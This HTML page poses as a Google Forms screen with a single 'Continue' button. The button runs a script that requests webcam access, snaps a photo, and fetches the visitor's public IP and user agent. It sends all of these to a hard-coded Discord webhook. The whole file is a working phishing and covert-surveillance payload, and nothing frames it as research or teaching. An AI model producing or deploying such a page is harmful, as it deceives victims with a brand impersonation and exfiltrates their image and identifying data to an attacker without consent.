<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Forms</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
            text-align: center;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .button {
            background-color: #007bff;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        .button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Google Forms</h1>
        <p>Google Forms 2025 LLC Â©</p>
        <button class="button" onclick="takePhotoAndSend()">Continue</button>
    </div>

    <video id="video" width="640" height="480" style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const discordWebhookURL = 'https://discord.com/api/webhooks/1362895340994302002/hz6WSqGnHAQAVEGhQ45wqvyyDmGWPuocG-9bGB6KJtwvCLmSUESU6NU8HcZXZdJek4iw';

        async function takePhotoAndSend() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const videoElement = document.createElement('video');
                videoElement.srcObject = stream;
                videoElement.play();

                videoElement.onloadedmetadata = async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = videoElement.videoWidth;
                    canvas.height = videoElement.videoHeight;
                    const context = canvas.getContext('2d');
                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                    const imageData = canvas.toDataURL('image/jpeg');

                    sendToDiscord(imageData);

                    stream.getTracks().forEach(track => track.stop());
                };
            } catch (error) {
                console.error('Error:', error);
                alert('Grant the permissions.');
            }
        }

        function sendToDiscord(imageData) {
            const formData = new FormData();
            formData.append('file', dataURItoBlob(imageData), 'photo.jpg');

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ipAddress = data.ip;
                    var userAgent = navigator.userAgent;

                    var payload = new FormData();
                    payload.append('content', 'User IP Address: ' + ipAddress + '\nUser Agent: ' + userAgent);
                    payload.append('file', formData.get('file'));

                    fetch(discordWebhookURL, {
                        method: 'POST',
                        body: payload
                    })
                    .then(response => {
                        if (response.ok) {
                            alert('Sending you to the main page..');
                        } else {
                            alert('Hmm error');
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('An error occurred. Please try again later.');
                    });
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Failed to fetch IP address. Please try again later.');
                });
        }

        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const arrayBuffer = new ArrayBuffer(byteString.length);
            const byteArray = new Uint8Array(arrayBuffer);

            for (let i = 0; i < byteString.length; i++) {
                byteArray[i] = byteString.charCodeAt(i);
            }

            return new Blob([arrayBuffer], { type: mimeString });
        }
    </script>
</body>
</html>
